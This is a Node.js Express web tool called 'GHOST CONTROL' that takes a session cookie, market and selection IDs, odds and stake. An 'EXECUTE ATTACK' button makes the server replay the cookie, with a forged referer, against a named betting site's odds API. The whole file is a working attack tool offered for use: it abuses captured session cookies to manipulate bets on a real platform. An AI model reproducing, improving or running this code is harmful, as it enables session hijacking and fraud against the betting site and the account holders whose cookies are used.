const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { background: #050505; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
                .card { max-width: 420px; margin: auto; background: #111; padding: 20px; border: 2px solid #00ffcc; border-radius: 15px; box-shadow: 0 0 20px #00ffcc44; }
                h1 { color: #00ffcc; font-size: 20px; text-shadow: 0 0 10px #00ffcc; }
                input { width: 92%; padding: 12px; margin: 6px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; font-size: 13px; }
                .manual-grid { display: flex; gap: 8px; margin: 10px 0; }
                .box { flex: 1; background: #000; padding: 8px; border-radius: 8px; border: 1px solid #00ffcc33; }
                .box label { font-size: 9px; color: #666; display: block; margin-bottom: 4px; }
                .box input { width: 85%; padding: 4px; font-size: 16px; font-weight: bold; color: #00ffcc; text-align: center; background: transparent; border: none; border-bottom: 1px solid #00ffcc; }
                #btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; font-weight: bold; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 15px; }
                #status { margin-top: 15px; font-weight: bold; color: #ffcc00; font-size: 14px; min-height: 20px; }
                #timer { font-size: 35px; color: #ff4d4d; font-weight: bold; display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>🚀 GHOST CONTROL v11.7.1</h1>
                <input id="c" placeholder="SESSION COOKIE">
                <input id="api" placeholder="MANUAL API URL (OPTIONAL)">
                
                <div class="manual-grid">
                    <input id="m" placeholder="MARKET ID" style="width:48%">
                    <input id="s" placeholder="SELECT ID" style="width:48%">
                </div>

                <div class="manual-grid">
                    <div class="box"><label>ODDS</label><input id="p" type="number" value="100"></div>
                    <div class="box"><label>STAKE</label><input id="stk" type="number" value="500"></div>
                </div>

                <div id="status">SYSTEM READY</div>
                <div id="timer">11s</div>
                <button id="btn" onclick="run()">⚡ EXECUTE ATTACK</button>
            </div>

            <script>
                async function run() {
                    const m = document.getElementById('m').value;
                    const s = document.getElementById('s').value;
                    const c = document.getElementById('c').value;
                    const p = document.getElementById('p').value;
                    const stk = document.getElementById('stk').value;
                    const api = document.getElementById('api').value;

                    if(!m || !s || !c) return alert("Bhai, Cookie aur IDs toh dalo!");

                    document.getElementById('btn').disabled = true;
                    document.getElementById('status').innerText = "ATTACKING...";
                    document.getElementById('timer').style.display = "block";

                    try {
                        const response = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({m, s, c, p, stk, api})
                        });
                        const data = await response.json();
                        
                        if(data.success) {
                            document.getElementById('status').innerText = "✅ ATTACK SUCCESSFUL!";
                            document.getElementById('status').style.color = "#00ff00";
                        } else {
                            document.getElementById('status').innerText = "❌ ERROR: " + data.message;
                            document.getElementById('status').style.color = "#ff4d4d";
                        }
                    } catch(e) {
                        document.getElementById('status').innerText = "❌ FAILED: SERVER OFFLINE";
                        document.getElementById('status').style.color = "#ff4d4d";
                    }

                    let t = 11;
                    let clock = setInterval(() => {
                        t--; document.getElementById('timer').innerText = t + "s";
                        if(t <= 0) { clearInterval(clock); location.reload(); }
                    }, 1000);
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/execute', async (req, res) => {
    try {
        const { m, s, c, p, stk, api } = req.body;
        let target = api || "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + m + "/" + s;
        
        const result = await axios.get(target, {
            headers: { 'cookie': c, 'referer': 'https://wizardnew.com/' },
            params: { odds: p, stake: stk },
            timeout: 6000
        });

        // Agar axios ne 200 OK diya toh success
        res.json({ success: true });

    } catch (e) {
        let msg = "Invalid Request";
        if (e.response) {
            // Agar site ne koi error code diya toh wo yahan aayega
            msg = "Site Rejected (Code: " + e.response.status + ")";
        } else if (e.code === 'ECONNABORTED') {
            msg = "Timeout (Site Slow)";
        }
        res.json({ success: false, message: msg });
    }
});

app.listen(process.env.PORT || 8080);
